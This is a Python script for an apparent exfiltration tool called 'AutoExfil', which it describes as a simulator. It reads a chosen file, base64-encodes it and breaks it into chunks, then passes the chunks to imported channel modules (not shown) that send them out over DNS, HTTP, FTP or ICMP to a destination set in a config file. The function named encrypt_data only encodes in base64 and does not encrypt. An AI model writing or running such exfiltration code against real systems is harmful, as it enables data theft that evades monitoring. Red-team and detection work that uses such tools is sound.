import argparse
import os
import json
import base64
from channels import dns, http, ftp, icmp

def chunk_data(data, size):
    return [data[i:i+size] for i in range(0, len(data), size)]

def encrypt_data(data):
    return base64.b64encode(data).decode()

def run_exfil(channel, file_path, config):
    with open(file_path, "rb") as f:
        raw_data = f.read()

    encrypted = encrypt_data(raw_data)
    chunks = chunk_data(encrypted, config["chunk_size"])

    if channel == "dns":
        dns.send(chunks, config)
    elif channel == "http":
        http.send(chunks, config)
    elif channel == "ftp":
        ftp.send(chunks, config)
    elif channel == "icmp":
        icmp.transmit(chunks, config)
    else:
        print(f"[!] Unknown exfil channel: {channel}")
        return

    print(f"[+] Exfil completed via {channel}")

def main():
    parser = argparse.ArgumentParser(description="AutoExfil - Automated Data Exfiltration Simulator")
    parser.add_argument("channel", choices=["dns", "http", "ftp", "icmp"], help="Exfiltration channel")
    parser.add_argument("file", help="File to exfiltrate")
    parser.add_argument("--config", default="config.json", help="Path to config file")
    args = parser.parse_args()

    if not os.path.exists(args.file):
        print("[!] File not found.")
        return

    with open(args.config) as f:
        config = json.load(f)

    run_exfil(args.channel, args.file, config)

if __name__ == "__main__":
    main()
